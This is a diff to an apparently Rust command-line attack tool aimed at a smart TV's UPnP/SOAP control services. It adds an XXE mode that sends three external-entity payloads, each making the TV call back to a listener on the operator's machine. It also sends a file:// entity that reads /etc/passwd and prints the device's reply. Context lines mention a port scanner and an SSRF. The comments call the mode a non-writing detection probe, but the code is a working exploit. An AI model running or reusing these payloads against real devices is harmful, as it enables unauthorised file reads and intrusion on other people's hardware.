@@ -780,6 +780,9 @@ fn usage() {
   --media <path>     mp4 to serve, faststart    (default ./media.mp4)
   --port <n>         local HTTP port            (default {DEFAULT_PORT})
   --status           read-only: transport + caption state, then exit
+  --xxe [ctrlURL]    probe the SOAP parsers for external-entity handling;
+                     out-of-band, nothing is written  (--xxe-file to name
+                     the file a file:// entity should read)
   --scan [ip]        TCP connect scan; --from/--to bound the range,
                      --threads and --scan-timeout tune it
   --ws               open the remote-control channel on :8001 and send a key;
@@ -930,6 +933,107 @@ fn run() {
     // Enumerate the target properly instead: a plain TCP connect scan, a handful
     // of threads, so the full list of listening services is known rather than
     // assumed.
+    // --xxe: every one of these services parses our XML before it decides
+    // anything - a bare GET or a bogus action still comes back as SOAP
+    // "402 Invalid Args", which means the document was read. If the parser was
+    // built without disabling external entities, that read is an arbitrary file
+    // read on the TV, and unlike the media-fetch SSRF it needs no player and no
+    // ACL. Detection is out-of-band: point an entity at our own listener and see
+    // whether the TV connects. Nothing is written and no action is invoked.
+    if args.has("--xxe") {
+        let ctrl = args.val("--xxe").unwrap_or_else(||
+            format!("http://{tv_ip}:9197/upnp/control/AVTransport1"));
+        let port: u16 = args.val("--port").and_then(|v| v.parse().ok()).unwrap_or(DEFAULT_PORT);
+        let file = args.val("--xxe-file").unwrap_or_else(|| "/etc/passwd".to_string());
+        let ip = match my_ip(&tv_ip) {
+            Ok(v) => v,
+            Err(e) => { eprintln!("cannot determine our address: {e}"); return; }
+        };
+        println!("=== XXE probe against {ctrl} ===");
+        println!("    callback http://{ip}:{port}/xxe   file {file}");
+
+        let hits = Arc::new(AtomicUsize::new(0));
+        let listener = match TcpListener::bind(("0.0.0.0", port)) {
+            Ok(l) => l,
+            Err(e) => { eprintln!("bind :{port}: {e}"); return; }
+        };
+        {
+            let hits = Arc::clone(&hits);
+            thread::Builder::new().stack_size(THREAD_STACK).spawn(move || {
+                for c in listener.incoming() {
+                    let Ok(mut s) = c else { continue };
+                    let peer = s.peer_addr().map(|a| a.to_string()).unwrap_or_else(|_| "?".into());
+                    let mut buf = [0u8; 1024];
+                    let n = s.read(&mut buf).unwrap_or(0);
+                    let req = String::from_utf8_lossy(&buf[..n]).into_owned();
+                    let line = req.lines().next().unwrap_or("").to_string();
+                    println!("    <<< CALLBACK from {peer}: {line}");
+                    hits.fetch_add(1, Ordering::Relaxed);
+                    // hand back a harmless empty entity so the parse can finish
+                    let body = "<!ENTITY x \"\">";
+                    let _ = s.write_all(format!(
+                        "HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\n\
+Content-Length: {}\r\nConnection: close\r\n\r\n{}", body.len(), body).as_bytes());
+                    let _ = s.shutdown(Shutdown::Write);
+                }
+            }).ok();
+        }
+
+        // Three shapes, because stacks differ in which one they resolve:
+        // an external general entity, an external parameter entity, and a
+        // SYSTEM DTD pulled from us.
+        let cases: [(&str, String); 3] = [
+            ("external general entity",
+             format!("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM \"http://{ip}:{port}/xxe?g\">]>\
+<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>\
+<u:GetTransportInfo xmlns:u=\"{AV_NS}\"><InstanceID>&e;</InstanceID></u:GetTransportInfo>\
+</s:Body></s:Envelope>")),
+            ("external parameter entity",
+             format!("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://{ip}:{port}/xxe?p\">%p;]>\
+<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>\
+<u:GetTransportInfo xmlns:u=\"{AV_NS}\"><InstanceID>0</InstanceID></u:GetTransportInfo>\
+</s:Body></s:Envelope>")),
+            ("external DTD",
+             format!("<?xml version=\"1.0\"?><!DOCTYPE s:Envelope SYSTEM \"http://{ip}:{port}/xxe?d\">\
+<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>\
+<u:GetTransportInfo xmlns:u=\"{AV_NS}\"><InstanceID>0</InstanceID></u:GetTransportInfo>\
+</s:Body></s:Envelope>")),
+        ];
+
+        for (label, body) in cases {
+            let before = hits.load(Ordering::Relaxed);
+            let r = http_post(&ctrl,
+                              &[("Content-Type", "text/xml; charset=\"utf-8\""),
+                                ("SOAPACTION", &format!("\"{AV_NS}#GetTransportInfo\""))],
+                              body.as_bytes());
+            let code = match r { Ok((c, _)) => c.to_string(), Err(e) => format!("err {e}") };
+            thread::sleep(Duration::from_secs(3));
+            let got = hits.load(Ordering::Relaxed) - before;
+            println!("[{}] HTTP {code}   callbacks: {got}{}",
+                     label, if got > 0 { "   <- ENTITY RESOLVED" } else { "" });
+        }
+
+        // A file:// entity would come back inside the fault text on a verbose
+        // stack; ask for it once so the response can be eyeballed.
+        let body = format!("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM \"file://{file}\">]>\
+<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>\
+<u:GetTransportInfo xmlns:u=\"{AV_NS}\"><InstanceID>&e;</InstanceID></u:GetTransportInfo>\
+</s:Body></s:Envelope>");
+        match http_post(&ctrl,
+                        &[("Content-Type", "text/xml; charset=\"utf-8\""),
+                          ("SOAPACTION", &format!("\"{AV_NS}#GetTransportInfo\""))],
+                        body.as_bytes()) {
+            Ok((c, b)) => {
+                println!("[file entity] HTTP {c}");
+                println!("    {}", &b[..b.len().min(500)]);
+            }
+            Err(e) => println!("[file entity] {e}"),
+        }
+
+        println!("\ntotal callbacks: {}", hits.load(Ordering::Relaxed));
+        return;
+    }
+
     if args.has("--scan") {
         let target = args.val("--scan").unwrap_or_else(|| tv_ip.clone());
         let from: u16 = args.val("--from").and_then(|v| v.parse().ok()).unwrap_or(1);
